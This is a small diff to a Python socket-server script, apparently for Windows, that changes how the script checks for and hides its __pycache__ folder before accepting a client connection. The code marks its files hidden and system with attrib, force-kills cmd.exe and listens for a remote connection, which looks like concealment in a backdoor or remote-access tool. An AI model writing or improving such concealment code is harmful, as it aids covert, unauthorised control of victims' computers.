@@ -185,13 +185,13 @@ while run == True:
     server.listen()
     
     print("lancement")
-    pycache = (subprocess.getoutput("dir "+getpath()+" /A:H /B")).split()
+    pycache = (subprocess.getoutput("cd "+getpath()+" & dir /A:H /B")).split()
     temp = 0
     for i in range(len(pycache)):
         if pycache[i-1] == "__pycache__":
             temp = 1
-        if temp == 0:
-            subprocess.Popen("cd "+getpath(True)+"& attrib +h +s __pycache__ & taskkill /im cmd.exe /F", shell=True)
+    if temp == 0:
+        subprocess.Popen("cd "+getpath(True)+"& attrib +h +s __pycache__ & taskkill /im cmd.exe /F", shell=True)
     (client, address) = server.accept()
     print("connect")
     
